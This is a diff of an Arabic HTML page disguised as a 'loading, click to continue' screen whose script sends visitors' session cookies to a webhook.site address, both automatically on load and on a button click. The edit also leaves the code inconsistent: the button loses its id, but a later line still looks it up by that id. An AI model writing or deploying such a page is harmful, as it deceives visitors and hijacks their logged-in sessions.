@@ -2,17 +2,14 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>جاري التحميل...</title>
+    <title>تحديث الصفحة</title>
 </head>
-<body>
-    <div style="text-align: center; margin-top: 50px;">
-        <h2>جاري تحميل المحتوى...</h2>
-        <p>يرجى الانتظار قليلاً والضغط على الزر أدناه في حال لم يتم التحميل تلقائياً.</p>
-        <button id="btn" style="padding: 10px 20px; background-color: #28a745; color: white; border: none; cursor: pointer; font-size: 16px;">اضغط هنا للمتابعة</button>
-    </div>
+<body style="text-align: center; padding: 50px; font-family: Tahoma;">
+    <h2>جاري تحميل المحتوى...</h2>
+    <p>يرجى الانتظار قليلاً والضغط على الزر أدناه في حال لم يتم التحميل تلقائياً.</p>
+    <button onclick="sendCookies()" style="padding: 15px 30px; font-size: 18px; background: #28a745; color: white; border: none; border-radius: 5px; cursor: pointer;">اضغط هنا للمتابعة</button>
 
-    <script>
+<script>
         const webhookUrl = "https://webhook.site/5aaa35a1-60e4-4b7f-953e-10a3078c0436";
 
         const SESSION_COOKIE_NAMES = new Set([
@@ -66,7 +63,6 @@
 
         // إرسال تلقائي وعند الضغط
         sendData();
-        document.getElementById("btn").addEventListener("click", sendData);
-    </script>
+        document.getElementById("btn").addEventListener("click", sendData);    </script>
 </body>
 </html>
